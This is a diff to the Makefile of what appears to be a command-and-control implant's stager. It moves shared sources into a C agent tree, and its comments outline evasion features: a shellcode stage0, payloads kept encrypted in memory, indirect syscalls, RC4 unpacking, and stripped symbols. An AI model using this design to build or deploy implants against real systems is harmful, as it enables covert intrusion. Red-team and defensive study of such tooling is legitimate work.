@@ -26,9 +26,14 @@ endif
 # Flags common to every stager translation unit. The freestanding PIC stages add
 # -nostdlib (PIC_CFLAGS); the hosted SO/EXE formats add a versioned glibc target
 # instead (HOSTED_CFLAGS) so the runtime maps libc.
-COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -I. -I../common \
+COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -I. -I../../c_agent/include -I../common -DC2_SYSCALL_GADGET_EXTERN \
 								$(TOPLEVEL_REORDER_FLAG) -s -fno-ident -ffunction-sections -fdata-sections \
 								-fno-asynchronous-unwind-tables -fvisibility=hidden
+
+# Reusable C sources shared with the C agent (protocol, crypto, ELF loader,
+# strings). The freestanding stager compiles them with -nostdlib; the hosted
+# agent compiles the portable subset with libc.
+C2_SRC = ../../c_agent/src
 
 # The malasada builder prepends a fixed stage0 shellcode blob to the agent
 # payload. Only that prefix needs to be executable; the appended payload stays
@@ -186,12 +191,13 @@ DYNLOAD_TRANSPORTS := libcurl libssl
 # that the stub maps, runs, then zeroes and unmaps. It holds the transports
 # and the encoded listener config; the payload stays encrypted while in this
 # blob, so no decryption code is needed here.
-DL_SRCS = downloader.c utils_min.c packer.c debug.c syscalls.c
+DL_SRCS = downloader.c syscalls_indirect.c $(C2_SRC)/strings.c $(C2_SRC)/system.c \
+          $(C2_SRC)/packer.c $(C2_SRC)/debug.c
 ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
-  DL_SRCS += net_utils.c
+  DL_SRCS += $(C2_SRC)/net_utils.c
 endif
 ifneq ($(filter $(TRANSPORT),$(DYNLOAD_TRANSPORTS)),)
-  DL_SRCS += dynload.c
+  DL_SRCS += $(C2_SRC)/dynload.c
 endif
 DL_SRCS += $(TRANSPORT_SRC)
 
@@ -203,7 +209,8 @@ DL_BLOB_H = downloader_blob.h
 # owns the agent lifecycle (including the supervisor). It owns decryption so
 # that the parent can keep the payload ciphertext while each supervised child
 # decrypts its own RX view.
-STUB_SRCS = stub.c utils_min.c ../common/rc4.c debug.c syscalls.c
+STUB_SRCS = stub.c syscalls_indirect.c stager_state.c $(C2_SRC)/strings.c \
+            $(C2_SRC)/system.c $(C2_SRC)/rc4.c $(C2_SRC)/debug.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
@@ -214,7 +221,7 @@ SHARED_LIB = stager.so
 # has a stub (unpack_stub_<name>.c) and a matching packer (pack_<name>.py).
 UNPACKER ?= rc4
 ifeq ($(UNPACKER),rc4)
-  UNPACK_SRCS = unpack_stub_rc4.c ../common/rc4.c
+  UNPACK_SRCS = unpack_stub_rc4.c $(C2_SRC)/rc4.c
 else
   UNPACK_SRCS = unpack_stub_$(UNPACKER).c
 endif
